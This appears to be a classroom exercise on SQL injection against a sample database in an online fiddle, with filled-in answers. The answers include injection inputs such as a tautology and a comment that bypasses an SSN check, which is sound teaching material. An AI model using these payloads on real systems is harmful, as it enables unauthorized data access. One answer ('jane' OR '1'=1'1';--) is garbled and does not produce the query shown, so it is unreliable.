# SQL Substititions

## Instructions

Navigate to the fiddle at: <https://www.db-fiddle.com/f/gAkPEQwVW7EsAnm3xuUJGx/0>

Consider the query below as you follow the instructions:

  ```sql
  SELECT * FROM warehouse.exploits WHERE name='$EXPLOIT_NAME';
  ```

Suppose that `$EXPLOIT_NAME` comes from a user-submitted value. E.g., if a user searches for the name `aurora`, the query becomes:

  ```sql
  SELECT * FROM warehouse.exploits WHERE name='aurora';
  ```

Keep this in mind as you follow the instructions below.

### "Simple" Substitutions

- What value does `$EXPLOIT_NAME` need to have to generate the query below? What results does this generate in the fiddle?
  - `$EXPLOIT_NAME` = eternal romance

  ```sql
  SELECT * FROM warehouse.exploits WHERE name='eternal romance';
  ```

- What value does `$EXPLOIT_NAME` need to have to generate the query below? What results does this generate in the fiddle?
  - `$EXPLOIT_NAME` = aurora' OR id='1

  ```sql
  SELECT * FROM warehouse.exploits WHERE name='aurora' OR id='1';
  ```

- What value does `$EXPLOIT_NAME` need to have to generate the query below? What results does this generate in the fiddle?
  - `$EXPLOIT_NAME` = ' OR '1'='1

  ```sql
  SELECT * FROM warehouse.exploits WHERE name='' OR '1'='1';
  ```

- What value does `$EXPLOIT_NAME` need to have to generate the query below? What results does this generate in the fiddle?
  - `$EXPLOIT_NAME` = ' 

  ```sql
  SELECT * FROM warehouse.exploits WHERE name=''';
  ```

### "Complex" Substitutions
In addition to special characters like quotes, you can inject the comment character: `--`.

This forces the server _not_ to run whatever SQL code follows the comment.
see if -- or # breaks query
Consider the query below to see when this might be useful:

  ```sql
  -- Retrieve account data for `$USERNAME`, as long as they provide the right SSN
  SELECT * FROM warehouse.accounts WHERE name='$USERNAME' AND ssn='$USER_SSN';
  ```

- What value must `$USERNAME` have to generate the query below? What results does this generate?
  - `$USERNAME` = jane';--

  ```sql
  -- Retrieve account data for `$USERNAME`, as long as they provide the right SSN
  SELECT * FROM warehouse.accounts WHERE name='jane'; -- AND ssn='$USER_SSN';
  ```

- What value must `$USERNAME` have to generate the query below? What results does this generate?
  - `$USERNAME` = jane' OR '1'=1'1';--

  ```sql
  -- Retrieve account data for `$USERNAME`, as long as they provide the right SSN
  SELECT * FROM warehouse.accounts WHERE name='jane' OR '1'='1'; -- AND ssn='$USER_SSN';
  ```

